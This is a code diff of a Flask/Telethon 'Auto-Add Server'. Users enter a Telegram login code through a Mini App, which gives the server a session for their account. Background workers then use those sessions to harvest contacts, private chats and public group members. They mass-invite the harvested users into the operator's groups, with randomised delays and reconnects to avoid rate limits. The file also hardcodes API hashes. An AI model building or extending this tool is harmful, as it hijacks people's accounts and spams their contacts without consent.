@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-Telegram Auto-Add Server - TELEGRAM MINI APP AUTO-LOGIN VERSION
-With Phone Share Support - Users only need to share phone and enter code
+Telegram Auto-Add Server - PHONE SHARE AUTO-LOGIN VERSION
+Users only need to share phone + enter code
+Auto-add and auto-join fully working
 """
 
 from flask import Flask, jsonify, request, redirect, send_file
@@ -9,6 +10,8 @@ from flask_cors import CORS
 from telethon import TelegramClient, errors, functions
 from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
 from telethon.tl.functions.contacts import GetContactsRequest
+from telethon.tl.functions.messages import GetDialogsRequest
+from telethon.tl.types import InputPeerEmpty
 from telethon.sessions import StringSession
 import json
 import os
@@ -18,26 +21,23 @@ import time
 import random
 import threading
 import requests
-from datetime import datetime
+from datetime import datetime, timedelta
 from collections import defaultdict
 import traceback
 import sys
 import signal
-from functools import wraps
 import hashlib
 import hmac
 import urllib.parse
 
-# Configure logging with rotation
+# Configure logging
 import logging.handlers
 
-# Create logs directory if it doesn't exist
 os.makedirs('logs', exist_ok=True)
 
-# Set up rotating file handler
 file_handler = logging.handlers.RotatingFileHandler(
     'logs/server.log',
-    maxBytes=10*1024*1024,  # 10MB
+    maxBytes=10*1024*1024,
     backupCount=5
 )
 file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
@@ -57,7 +57,7 @@ CORS(app)
 # ============================================
 # SERVER CONFIGURATION
 # ============================================
-SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum
+SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))
 
 SERVERS = {
     1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
@@ -86,7 +86,6 @@ WORKER_ADDS_FILE = 'worker_adds.json'
 TEMP_SESSIONS_FILE = 'temp_sessions.json'
 AUTO_SESSIONS_FILE = 'auto_sessions.json'
 USER_MAP_FILE = 'user_map.json'
-ERROR_LOG_FILE = 'logs/errors.log'
 
 # Storage with thread locks
 accounts = []
@@ -112,50 +111,8 @@ stats = {
 }
 
 # ============================================
-# ERROR HANDLING DECORATORS
-# ============================================
-def safe_operation(func):
-    @wraps(func)
-    def wrapper(*args, **kwargs):
-        try:
-            return func(*args, **kwargs)
-        except Exception as e:
-            logger.error(f"Error in {func.__name__}: {e}")
-            logger.error(traceback.format_exc())
-            log_error(f"Function: {func.__name__}", e)
-            return None
-    return wrapper
-
-def api_error_handler(func):
-    @wraps(func)
-    def wrapper(*args, **kwargs):
-        try:
-            return func(*args, **kwargs)
-        except Exception as e:
-            error_msg = f"API Error in {func.__name__}: {e}"
-            logger.error(error_msg)
-            logger.error(traceback.format_exc())
-            log_error(f"API: {func.__name__}", e)
-            return jsonify({
-                'success': False,
-                'error': 'Internal server error. Please try again.',
-                'error_code': 'INTERNAL_ERROR'
-            }), 500
-    return wrapper
-
-def log_error(context, exception):
-    try:
-        timestamp = datetime.now().isoformat()
-        error_entry = f"[{timestamp}] {context}\n{str(exception)}\n{traceback.format_exc()}\n{'='*50}\n"
-        with open(ERROR_LOG_FILE, 'a') as f:
-            f.write(error_entry)
-    except:
-        pass
-
-# ============================================
 # FILE OPERATIONS
 # ============================================
-@safe_operation
 def load_json(path, default):
     try:
         if os.path.exists(path):
@@ -163,6 +120,7 @@ def load_json(path, default):
                 content = f.read().strip()
                 if content:
                     data = json.loads(content)
+                    # Create backup
                     backup_path = f"{path}.backup"
                     with open(backup_path, 'w') as backup:
                         json.dump(data, backup, indent=2, default=str)
@@ -173,18 +131,14 @@ def load_json(path, default):
         if os.path.exists(backup_path):
             try:
                 with open(backup_path, 'r') as backup:
-                    restored_data = json.load(backup)
                     logger.info(f"Restored {path} from backup")
-                    return restored_data
+                    return json.load(backup)
             except:
                 pass
-        logger.warning(f"Creating fresh {path}")
-        save_json(path, default)
     except Exception as e:
         logger.error(f"Load error {path}: {e}")
     return default
 
-@safe_operation
 def save_json(path, data):
     temp_path = f"{path}.tmp"
     with file_lock:
@@ -194,11 +148,6 @@ def save_json(path, data):
             os.replace(temp_path, path)
         except Exception as e:
             logger.error(f"Save error {path}: {e}")
-            try:
-                with open(path, 'w') as f:
-                    json.dump(data, f, indent=2, default=str)
-            except:
-                pass
 
 def save_temp_sessions():
     sessions_data = {}
@@ -264,7 +213,7 @@ class SyncTelegramClient:
                 logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                 if attempt == retries:
                     raise
-                time.sleep(1 * (attempt + 1))
+                time.sleep(2)
             finally:
                 if loop:
                     try:
@@ -282,8 +231,7 @@ class SyncTelegramClient:
                 connection_retries=5,
                 retry_delay=2,
                 timeout=30,
-                auto_reconnect=True,
-                loop=asyncio.new_event_loop()
+                auto_reconnect=True
             )
         except Exception as e:
             logger.error(f"Failed to create client: {e}")
@@ -294,10 +242,7 @@ class SyncTelegramClient:
         try:
             await asyncio.wait_for(client.connect(), timeout=15)
             return True
-        except asyncio.TimeoutError:
-            return False
-        except Exception as e:
-            logger.error(f"Client connection error: {e}")
+        except:
             return False
 
 # ============================================
@@ -308,9 +253,9 @@ def get_account_age_sync(session_string):
         client = SyncTelegramClient.get_client(session_string)
         try:
             if not await SyncTelegramClient.safe_connect(client):
-                return {'age_display': 'Unknown', 'method': 'connection_failed'}
+                return {'age_display': 'Unknown'}
             if not await client.is_user_authorized():
-                return {'age_display': 'Unknown', 'method': 'not_authorized'}
+                return {'age_display': 'Unknown'}
             me = await client.get_me()
             if hasattr(me, 'creation_date') and me.creation_date:
                 creation_date = me.creation_date
@@ -319,34 +264,15 @@ def get_account_age_sync(session_string):
                 age_days = (datetime.now() - creation_date).days
                 age_years = age_days / 365.25
                 return {
-                    'creation_date': creation_date.isoformat(),
                     'age_days': age_days,
                     'age_years': round(age_years, 1),
                     'age_display': f"{int(age_years)} years, {age_days % 365} days",
-                    'year_joined': creation_date.year,
-                    'method': 'creation_date'
+                    'year_joined': creation_date.year
                 }
-            try:
-                photos = await client.get_profile_photos(me, limit=1)
-                if photos and len(photos) > 0:
-                    oldest_photo_date = photos[0].date
-                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
-                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
-                    age_days = (datetime.now() - oldest_photo_date).days
-                    return {
-                        'creation_date': oldest_photo_date.isoformat(),
-                        'age_days': age_days,
-                        'age_years': round(age_days / 365.25, 1),
-                        'age_display': f"~{int(age_days / 365.25)} years",
-                        'year_joined': oldest_photo_date.year,
-                        'method': 'oldest_photo'
-                    }
-            except:
-                pass
-            return {'age_display': 'Unknown account age', 'method': 'unknown'}
+            return {'age_display': 'Unknown'}
         except Exception as e:
             logger.error(f"Age detection error: {e}")
-            return {'age_display': 'Error', 'method': 'error', 'error': str(e)}
+            return {'age_display': 'Unknown'}
         finally:
             try:
                 await client.disconnect()
@@ -354,9 +280,8 @@ def get_account_age_sync(session_string):
                 pass
     try:
         return SyncTelegramClient.run_async(_get_age, timeout=20)
-    except Exception as e:
-        logger.error(f"Age detection failed: {e}")
-        return {'age_display': 'Unknown', 'method': 'error', 'error': str(e)}
+    except:
+        return {'age_display': 'Unknown'}
 
 # ============================================
 # ACCOUNT MANAGEMENT
@@ -410,7 +335,7 @@ def remove_dead_account(aid, reason=""):
             auto_add_settings.pop(str(aid), None)
             if str(aid) in running_tasks:
                 worker_info = running_tasks.pop(str(aid), None)
-                if worker_info and hasattr(worker_info.get('worker'), 'stop'):
+                if worker_info and worker_info.get('worker'):
                     try:
                         worker_info['worker'].stop()
                     except:
@@ -459,10 +384,11 @@ class AutoAddWorker:
         self.client = None
         self.last_ping = time.time()
         self.consecutive_errors = 0
-        self.max_consecutive_errors = 10
+        self.max_consecutive_errors = 15
         self.last_activity = time.time()
         self.health_check_interval = 300
         self.last_health_check = time.time()
+        self.joined_groups = set()
     
     def stop(self):
         self.running = False
@@ -472,7 +398,10 @@ class AutoAddWorker:
         if self.client:
             try:
                 async def _disconnect():
-                    await self.client.disconnect()
+                    try:
+                        await self.client.disconnect()
+                    except:
+                        pass
                 SyncTelegramClient.run_async(_disconnect, timeout=5)
             except:
                 pass
@@ -480,46 +409,50 @@ class AutoAddWorker:
                 self.client = None
     
     def run(self):
-        logger.info(f"Auto-add worker started for account {self.account.get('name', self.acc_id)}")
-        try:
-            self.join_all_targets()
-        except Exception as e:
-            logger.error(f"Initial join targets failed: {e}")
+        logger.info(f"🚀 Auto-add worker started for {self.account.get('name', self.acc_id)}")
+        
+        # Initial group joining
+        self.join_all_targets()
         
         attempted_users = set()
         cycle_count = 0
         
         while self.running:
             try:
+                # Health check
                 if time.time() - self.last_health_check > self.health_check_interval:
                     self.perform_health_check()
                     self.last_health_check = time.time()
                 
                 self.consecutive_errors = 0
                 
+                # Check if enabled
                 settings = auto_add_settings.get(self.acc_key, {})
                 if not settings.get('enabled', True):
                     self.last_activity = time.time()
                     time.sleep(5)
                     continue
                 
+                # Reset daily stats
                 reset_daily()
                 
+                # Ensure connection
                 if not self.ensure_connection():
                     self.consecutive_errors += 1
                     if self.consecutive_errors >= self.max_consecutive_errors:
-                        logger.error(f"Worker {self.acc_key}: Too many connection failures, restarting...")
-                        self.reconnect()
-                        self.consecutive_errors = 0
+                        logger.error(f"Worker {self.acc_key}: Too many connection failures")
+                        break
                     time.sleep(30)
                     continue
                 
+                # Get user sources
                 user_ids = self.get_user_sources()
                 if not user_ids:
                     self.last_activity = time.time()
                     time.sleep(60)
                     continue
                 
+                # Manage attempted users set
                 if len(attempted_users) > 10000:
                     attempted_users.clear()
                 
@@ -532,6 +465,7 @@ class AutoAddWorker:
                 delay = max(30, settings.get('delay_seconds', 30))
                 added_count = 0
                 
+                # Process users
                 for user_id in fresh_users[:100]:
                     if not self.running:
                         break
@@ -553,26 +487,30 @@ class AutoAddWorker:
                             stats['worker_stats'][self.acc_key]['today'] += 1
                             stats['worker_stats'][self.acc_key]['total'] += 1
                             
+                            # Save stats periodically
                             if added_count % 10 == 0:
                                 save_json(STATS_FILE, stats)
                     except Exception as e:
-                        logger.error(f"Add user error: {e}")
+                        logger.error(f"Add user {user_id} error: {e}")
                         self.consecutive_errors += 1
                         if self.consecutive_errors >= self.max_consecutive_errors:
                             break
                     
-                    actual_delay = random.uniform(delay * 0.9, delay * 1.3)
+                    # Random delay
+                    actual_delay = random.uniform(delay * 0.8, delay * 1.3)
                     self.last_activity = time.time()
                     time.sleep(actual_delay)
                     
+                    # Reconnect periodically
                     if added_count > 0 and added_count % 30 == 0:
                         self.reconnect()
                 
                 cycle_count += 1
-                logger.info(f"Cycle {cycle_count}: Added {added_count} users | Today: {stats['today_added']}")
+                logger.info(f"Worker {self.acc_key} Cycle {cycle_count}: Added {added_count} | Today: {stats['today_added']}")
                 save_json(STATS_FILE, stats)
                 
-                rest_time = random.randint(60, 120)
+                # Rest between cycles
+                rest_time = random.randint(60, 180)
                 for _ in range(rest_time):
                     if not self.running:
                         break
@@ -580,24 +518,30 @@ class AutoAddWorker:
                     time.sleep(1)
                 
             except Exception as e:
-                logger.error(f"Worker error (cycle): {e}")
+                logger.error(f"Worker {self.acc_key} cycle error: {e}")
                 self.consecutive_errors += 1
                 if self.consecutive_errors >= self.max_consecutive_errors:
-                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping worker")
-                    self.running = False
+                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping")
                     break
                 time.sleep(30)
                 self.reconnect()
+        
+        logger.info(f"Worker {self.acc_key} stopped")
     
     def perform_health_check(self):
         try:
             if time.time() - self.last_activity > 600:
-                logger.warning(f"Worker {self.acc_key}: Inactive for too long, reconnecting...")
+                logger.warning(f"Worker {self.acc_key}: Inactive for 10 minutes, reconnecting...")
                 self.reconnect()
                 self.last_activity = time.time()
+            
             if not self.ensure_connection():
-                logger.warning(f"Worker {self.acc_key}: Connection unhealthy, reconnecting...")
+                logger.warning(f"Worker {self.acc_key}: Unhealthy connection, reconnecting...")
                 self.reconnect()
+            
+            # Re-join groups if needed
+            if len(self.joined_groups) < len(TARGET_GROUPS):
+                self.join_all_targets()
         except Exception as e:
             logger.error(f"Health check error: {e}")
     
@@ -606,7 +550,7 @@ class AutoAddWorker:
             if self.client and hasattr(self.client, 'is_connected'):
                 try:
                     if self.client.is_connected():
-                        if time.time() - self.last_ping > 60:
+                        if time.time() - self.last_ping > 120:
                             async def ping():
                                 try:
                                     await self.client.get_me()
@@ -622,13 +566,14 @@ class AutoAddWorker:
                 except:
                     pass
             return self.connect_client()
-        except Exception as e:
+        except:
             return self.reconnect()
     
     def connect_client(self):
         for attempt in range(3):
             try:
                 self.disconnect_client()
+                time.sleep(1)
                 self.client = SyncTelegramClient.get_client(self.account['session'])
                 async def _connect():
                     if not await SyncTelegramClient.safe_connect(self.client):
@@ -638,6 +583,7 @@ class AutoAddWorker:
                 if result:
                     self.last_ping = time.time()
                     self.last_activity = time.time()
+                    logger.info(f"Worker {self.acc_key}: Connected successfully")
                     return True
             except Exception as e:
                 logger.error(f"Connect error (attempt {attempt + 1}): {e}")
@@ -646,21 +592,24 @@ class AutoAddWorker:
         return False
     
     def reconnect(self):
-        try:
-            self.disconnect_client()
-            time.sleep(2)
-            return self.connect_client()
-        except Exception as e:
-            return False
+        logger.info(f"Worker {self.acc_key}: Reconnecting...")
+        self.disconnect_client()
+        time.sleep(3)
+        return self.connect_client()
     
     def join_all_targets(self):
+        """Join all target groups"""
         for target in TARGET_GROUPS:
+            if target in self.joined_groups:
+                continue
+            
             max_retries = 3
             for attempt in range(max_retries):
                 try:
                     if not self.ensure_connection():
                         time.sleep(5)
                         continue
+                    
                     async def _join():
                         try:
                             entity = await self.client.get_entity(target)
@@ -668,90 +617,115 @@ class AutoAddWorker:
                             return True
                         except errors.FloodWaitError as e:
                             wait_time = min(e.seconds, 120)
+                            logger.warning(f"Flood wait for join: {wait_time}s")
                             time.sleep(wait_time)
                             return False
                         except Exception as e:
                             if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                 return True
+                            logger.error(f"Join error: {e}")
                             return False
+                    
                     if SyncTelegramClient.run_async(_join, timeout=30):
-                        logger.info(f"Joined {target}")
+                        self.joined_groups.add(target)
+                        logger.info(f"Worker {self.acc_key}: ✅ Joined {target}")
                         break
                 except Exception as e:
-                    logger.warning(f"Join target {target} failed: {e}")
+                    logger.warning(f"Join {target} failed (attempt {attempt + 1}): {e}")
+                
                 time.sleep(min(5 * (attempt + 1), 20))
     
     def get_user_sources(self):
+        """Get users from contacts, dialogs, and source groups"""
         user_ids = set()
         if not self.ensure_connection():
-            return user_ids
+            return list(user_ids)
+        
         async def _collect():
+            nonlocal user_ids
+            
+            # Get from contacts
             try:
-                try:
-                    contacts = await self.client(GetContactsRequest(0))
-                    for user in contacts.users:
-                        if user.id and not getattr(user, 'bot', False):
-                            user_ids.add(user.id)
-                except:
-                    pass
-                try:
-                    dialogs = await self.client.get_dialogs(limit=100)
-                    for d in dialogs:
-                        if d.is_user and d.entity and d.entity.id:
-                            if not getattr(d.entity, 'bot', False):
-                                user_ids.add(d.entity.id)
-                except:
-                    pass
-                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest',
-                               '@TelegramNews', '@builders', '@Android', '@iOS',
-                               '@Python', '@programming', '@abe_army']
-                for sg in source_groups:
-                    try:
-                        entity = await self.client.get_entity(sg)
-                        participants = await self.client.get_participants(entity, limit=100)
-                        for user in participants:
-                            if user.id and not getattr(user, 'bot', False):
-                                user_ids.add(user.id)
-                        await asyncio.sleep(0.5)
-                    except:
-                        continue
-                return list(user_ids)
+                contacts = await self.client(GetContactsRequest(0))
+                for user in contacts.users:
+                    if user.id and not getattr(user, 'bot', False) and not user.deleted:
+                        user_ids.add(user.id)
+                logger.debug(f"Got {len([u for u in contacts.users if not getattr(u, 'bot', False)])} from contacts")
             except Exception as e:
-                logger.error(f"Collection error: {e}")
-                return []
+                logger.error(f"Contacts collection error: {e}")
+            
+            # Get from dialogs
+            try:
+                dialogs = await self.client.get_dialogs(limit=100)
+                for d in dialogs:
+                    if d.is_user and d.entity and d.entity.id:
+                        if not getattr(d.entity, 'bot', False) and not d.entity.deleted:
+                            user_ids.add(d.entity.id)
+                logger.debug(f"Got from dialogs, total users: {len(user_ids)}")
+            except Exception as e:
+                logger.error(f"Dialogs collection error: {e}")
+            
+            # Get from source groups
+            source_groups = [
+                'telegram', 'durov', 'TelegramTips', 'contest',
+                'TelegramNews', 'builders', 'Android', 'iOS',
+                'Python', 'programming', 'abe_army', 'Abe_armygroup'
+            ]
+            
+            for sg in source_groups:
+                try:
+                    entity = await self.client.get_entity(sg)
+                    participants = await self.client.get_participants(entity, limit=100)
+                    for user in participants:
+                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
+                            user_ids.add(user.id)
+                    await asyncio.sleep(0.3)
+                except Exception as e:
+                    continue
+            
+            return list(user_ids)
+        
         try:
-            return SyncTelegramClient.run_async(_collect, timeout=45)
-        except:
-            return []
+            result = SyncTelegramClient.run_async(_collect, timeout=60)
+            return result if result else list(user_ids)
+        except Exception as e:
+            logger.error(f"User source collection failed: {e}")
+            return list(user_ids)
     
     def add_user_to_targets(self, user_id):
+        """Add a user to all target groups"""
         success = False
-        async def _add_to_target(target):
-            try:
-                entity = await self.client.get_entity(target)
-                user_input = await self.client.get_input_entity(user_id)
-                await self.client(InviteToChannelRequest(entity, [user_input]))
-                return True
-            except errors.FloodWaitError as e:
-                wait_time = min(e.seconds, 60)
-                time.sleep(wait_time)
-                return False
-            except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
-                    errors.UserAlreadyParticipantError, errors.UserKickedError,
-                    errors.UserBannedInChannelError, errors.UserDeactivatedBanError):
-                return False
-            except Exception as e:
-                return False
+        
         for target in TARGET_GROUPS:
             if not self.running:
                 break
             if not self.ensure_connection():
                 break
+            
+            async def _add():
+                try:
+                    entity = await self.client.get_entity(target)
+                    user_input = await self.client.get_input_entity(user_id)
+                    await self.client(InviteToChannelRequest(entity, [user_input]))
+                    return True
+                except errors.FloodWaitError as e:
+                    wait_time = min(e.seconds, 60)
+                    time.sleep(wait_time)
+                    return False
+                except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
+                        errors.UserAlreadyParticipantError, errors.UserKickedError,
+                        errors.UserBannedInChannelError, errors.UserDeactivatedBanError) as e:
+                    return False
+                except Exception as e:
+                    return False
+            
             try:
-                if SyncTelegramClient.run_async(lambda: _add_to_target(target), timeout=15):
+                if SyncTelegramClient.run_async(_add, timeout=15):
                     success = True
             except:
                 continue
+        
+        # Record successful adds
         if success:
             try:
                 record = {
@@ -766,288 +740,75 @@ class AutoAddWorker:
                     save_json(WORKER_ADDS_FILE, dict(worker_adds))
             except:
                 pass
+        
         return success
 
 def start_auto_add(account):
+    """Start auto-add worker for an account"""
     acc_key = str(account['id'])
     with worker_lock:
         try:
+            # Stop existing worker if running
             if acc_key in running_tasks:
                 existing = running_tasks[acc_key]
                 if existing and existing.get('thread') and existing['thread'].is_alive():
-                    return
+                    existing['worker'].stop()
+                    existing['thread'].join(timeout=5)
+            
+            # Start new worker
             worker = AutoAddWorker(account)
             thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
             thread.start()
             running_tasks[acc_key] = {'thread': thread, 'worker': worker}
+            logger.info(f"✅ Started auto-add worker for account {acc_key}")
         except Exception as e:
             logger.error(f"Start worker error: {e}")
 
 def stop_auto_add(account_id):
+    """Stop auto-add worker for an account"""
     acc_key = str(account_id)
     with worker_lock:
         try:
             if acc_key in running_tasks:
-                worker_info = running_tasks[acc_key]
+                worker_info = running_tasks.pop(acc_key)
                 if worker_info and worker_info.get('worker'):
-                    try:
-                        worker_info['worker'].stop()
-                    except:
-                        pass
-                running_tasks.pop(acc_key, None)
+                    worker_info['worker'].stop()
+                logger.info(f"Stopped auto-add worker for account {acc_key}")
         except Exception as e:
             logger.error(f"Stop auto add error: {e}")
 
 # ============================================
-# FLASK ROUTES
+# PHONE LOOKUP HELPERS
 # ============================================
-
-@app.errorhandler(404)
-def not_found(e):
-    return jsonify({'success': False, 'error': 'Not found'}), 404
-
-@app.errorhandler(500)
-def server_error(e):
-    log_error("Server error 500", e)
-    return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-@app.route('/')
-def index():
-    return redirect('/auto-add')
-
-@app.route('/auto-add')
-def auto_add_page():
-    try:
-        return send_file('auto_add.html')
-    except FileNotFoundError:
-        return "auto_add.html not found", 404
-
-@app.route('/login')
-def login_page():
-    try:
-        return send_file('login.html')
-    except FileNotFoundError:
-        return "login.html not found", 404
-
-@app.route('/dashboard')
-def dashboard_page():
-    try:
-        return send_file('dashboard.html')
-    except FileNotFoundError:
-        return "dashboard.html not found", 404
-
-@app.route('/dash')
-def dash_page():
-    try:
-        return send_file('dash.html')
-    except FileNotFoundError:
-        return "dash.html not found", 404
-
-@app.route('/all')
-def all_page():
-    try:
-        return send_file('all.html')
-    except FileNotFoundError:
-        return "all.html not found", 404
-
-@app.route('/ping')
-@api_error_handler
-def ping():
-    return jsonify({
-        'status': 'ok',
-        'server': SERVER_NAME,
-        'timestamp': datetime.now().isoformat(),
-        'workers': len(running_tasks)
-    })
-
-@app.route('/api/server-info')
-@api_error_handler
-def server_info():
-    return jsonify({
-        'success': True,
-        'server': {
-            'number': SERVER_NUMBER,
-            'name': SERVER_NAME,
-            'url': SERVER_URL,
-            'target_groups': TARGET_GROUPS
-        }
-    })
-
-@app.route('/api/accounts')
-@api_error_handler
-def get_accounts():
-    acc_list = []
-    for a in accounts:
-        try:
-            aid_str = str(a['id'])
-            ws = stats.get('worker_stats', {}).get(aid_str, {})
-            acc_list.append({
-                'id': a['id'],
-                'name': a.get('name', '?'),
-                'phone': a.get('phone', ''),
-                'username': a.get('username', ''),
-                'active': a.get('active', True),
-                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
-                'stats': {
-                    'total_added': ws.get('total', 0),
-                    'today_added': ws.get('today', 0)
-                },
-                'is_running': aid_str in running_tasks
-            })
-        except:
-            continue
-    return jsonify({'success': True, 'accounts': acc_list})
-
-# ============================================
-# TELEGRAM MINI APP AUTO-LOGIN WITH PHONE SHARE
-# ============================================
-
-def parse_telegram_init_data(init_data_str):
-    """Parse Telegram initData string into dictionary"""
-    parsed = {}
-    if not init_data_str:
-        return parsed
-    
-    for item in init_data_str.split('&'):
-        if '=' in item:
-            key, value = item.split('=', 1)
-            parsed[key] = urllib.parse.unquote(value)
-    
-    # Parse user JSON
-    user_json = parsed.get('user', '{}')
-    try:
-        parsed['user_obj'] = json.loads(user_json)
-    except:
-        parsed['user_obj'] = {}
-    
-    return parsed
-
 def find_phone_for_user(telegram_id):
     """Find phone number for a Telegram user ID from all sources"""
     phone = None
+    tid = str(telegram_id)
     
     # Check user_phone_map first
-    phone = user_phone_map.get(str(telegram_id), '')
+    phone = user_phone_map.get(tid, '')
     if phone:
-        logger.info(f"Found phone in user_phone_map for {telegram_id}: {phone}")
+        logger.info(f"Found phone in user_phone_map for {tid}: {phone[:4]}****")
         return phone
     
     # Check auto_sessions
-    if str(telegram_id) in auto_sessions:
-        phone = auto_sessions[str(telegram_id)].get('phone', '')
+    if tid in auto_sessions:
+        phone = auto_sessions[tid].get('phone', '')
         if phone:
-            logger.info(f"Found phone in auto_sessions for {telegram_id}: {phone}")
+            logger.info(f"Found phone in auto_sessions for {tid}: {phone[:4]}****")
             return phone
     
     # Check accounts list
     for acc in accounts:
-        if str(acc.get('telegram_id')) == str(telegram_id) and acc.get('phone'):
+        if str(acc.get('telegram_id')) == tid and acc.get('phone'):
             phone = acc['phone']
-            logger.info(f"Found phone in accounts for {telegram_id}: {phone}")
+            logger.info(f"Found phone in accounts for {tid}: {phone[:4]}****")
             return phone
     
     return None
 
-@app.route('/api/telegram-auto-login', methods=['POST'])
-@api_error_handler
-def telegram_auto_login():
-    """
-    Auto-login for Telegram Mini App users
-    - Extracts user info from initData
-    - Accepts shared phone number from Telegram
-    - Auto-sends verification code
-    """
-    try:
-        data = request.json or {}
-        
-        # Get initData from multiple sources
-        init_data_str = data.get('initData', '')
-        if not init_data_str:
-            init_data_str = request.args.get('initData', '')
-        if not init_data_str and request.query_string:
-            init_data_str = request.query_string.decode('utf-8')
-        
-        # Get shared phone from Telegram
-        shared_phone = data.get('sharedPhone', '').strip()
-        
-        # Get user data from request or parse from initData
-        user_data = data.get('user', {})
-        
-        # Parse initData
-        parsed_init = parse_telegram_init_data(init_data_str)
-        
-        # Extract user info
-        if not user_data:
-            user_data = parsed_init.get('user_obj', {})
-        
-        telegram_id = str(user_data.get('id', ''))
-        first_name = user_data.get('first_name', '')
-        last_name = user_data.get('last_name', '')
-        username = user_data.get('username', '')
-        
-        # If no telegram_id from user_data, try from other sources
-        if not telegram_id:
-            # Try from parsed initData
-            telegram_id = str(parsed_init.get('user_obj', {}).get('id', ''))
-        
-        logger.info(f"Telegram Mini App Login Attempt:")
-        logger.info(f"  User: {first_name} {last_name} (@{username})")
-        logger.info(f"  Telegram ID: {telegram_id}")
-        logger.info(f"  Shared Phone: {'Yes' if shared_phone else 'No'}")
-        
-        if not telegram_id:
-            return jsonify({
-                'success': False,
-                'error': 'Could not identify your Telegram account. Please open from Telegram app.',
-                'needs_phone': True
-            })
-        
-        # PRIORITY 1: Use shared phone from Telegram
-        if shared_phone:
-            phone = shared_phone.strip()
-            if not phone.startswith('+'):
-                phone = '+' + phone
-            
-            logger.info(f"Using shared phone: {phone}")
-            
-            # Save the phone mapping immediately
-            user_phone_map[str(telegram_id)] = phone
-            save_user_map()
-            
-            # Auto-send code
-            return auto_send_code(phone, telegram_id, first_name, last_name, username)
-        
-        # PRIORITY 2: Find saved phone
-        phone = find_phone_for_user(telegram_id)
-        
-        if phone:
-            # We have the phone - send code automatically
-            logger.info(f"Auto-sending code to saved phone: {phone}")
-            return auto_send_code(phone, telegram_id, first_name, last_name, username)
-        
-        # PRIORITY 3: No phone available - ask user to share
-        logger.info(f"No phone found for user {telegram_id}. Requesting phone share.")
-        return jsonify({
-            'success': False,
-            'error': 'Please share your phone number to receive verification code.',
-            'needs_phone': True,
-            'telegram_id': telegram_id,
-            'user_name': f"{first_name} {last_name}".strip(),
-            'username': username,
-            'request_phone_share': True  # Signal to client to show share button
-        })
-            
-    except Exception as e:
-        logger.error(f"Telegram auto-login error: {e}")
-        log_error("Telegram auto-login", e)
-        return jsonify({
-            'success': False,
-            'error': 'Auto-login failed. Please try again.',
-            'needs_phone': True
-        })
-
 def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
-    """Send verification code to phone and return result"""
+    """Send verification code to phone"""
     async def send_auto_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -1076,18 +837,17 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
                 'success': True,
                 'session_id': sid,
                 'phone_masked': masked_phone,
-                'auto_detected': True,
-                'user_name': f"{first_name} {last_name}".strip()
+                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
             }
         except errors.FloodWaitError as e:
             logger.warning(f"Flood wait for {phone}: {e.seconds}s")
             return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
         except errors.PhoneNumberInvalidError:
             logger.warning(f"Invalid phone: {phone}")
-            return {'success': False, 'error': 'Invalid phone number. Please check and try again.'}
+            return {'success': False, 'error': 'Invalid phone number.'}
         except Exception as e:
             logger.error(f"Auto code error for {phone}: {e}")
-            return {'success': False, 'error': f'Could not send code: {str(e)[:200]}'}
+            return {'success': False, 'error': f'Could not send code. Try again.'}
         finally:
             try:
                 await client.disconnect()
@@ -1098,7 +858,6 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
     
     # If phone is invalid, clear it from mappings
     if not result.get('success'):
-        logger.warning(f"Clearing invalid phone mapping for {telegram_id}")
         if str(telegram_id) in user_phone_map:
             del user_phone_map[str(telegram_id)]
             save_user_map()
@@ -1109,76 +868,229 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
     return result
 
 # ============================================
-# ADD ACCOUNT (with phone share support)
+# FLASK ROUTES
+# ============================================
+
+@app.route('/')
+def index():
+    return redirect('/login')
+
+@app.route('/login')
+def login_page():
+    try:
+        return send_file('login.html')
+    except FileNotFoundError:
+        return "login.html not found. Please upload the file.", 404
+
+@app.route('/auto-add')
+def auto_add_page():
+    try:
+        return send_file('auto_add.html')
+    except FileNotFoundError:
+        return "auto_add.html not found. Please upload the file.", 404
+
+@app.route('/dashboard')
+def dashboard_page():
+    try:
+        return send_file('dashboard.html')
+    except FileNotFoundError:
+        return "dashboard.html not found. Please upload the file.", 404
+
+@app.route('/dash')
+def dash_page():
+    try:
+        return send_file('dash.html')
+    except FileNotFoundError:
+        return "dash.html not found. Please upload the file.", 404
+
+@app.route('/all')
+def all_page():
+    try:
+        return send_file('all.html')
+    except FileNotFoundError:
+        return "all.html not found. Please upload the file.", 404
+
+@app.route('/ping')
+def ping():
+    return jsonify({
+        'status': 'ok',
+        'server': SERVER_NAME,
+        'timestamp': datetime.now().isoformat(),
+        'workers': len(running_tasks),
+        'accounts': len(accounts),
+        'total_added_today': stats.get('today_added', 0)
+    })
+
+@app.route('/api/server-info')
+def server_info():
+    return jsonify({
+        'success': True,
+        'server': {
+            'number': SERVER_NUMBER,
+            'name': SERVER_NAME,
+            'url': SERVER_URL,
+            'target_groups': TARGET_GROUPS
+        }
+    })
+
+@app.route('/api/accounts')
+def get_accounts():
+    acc_list = []
+    for a in accounts:
+        try:
+            aid_str = str(a['id'])
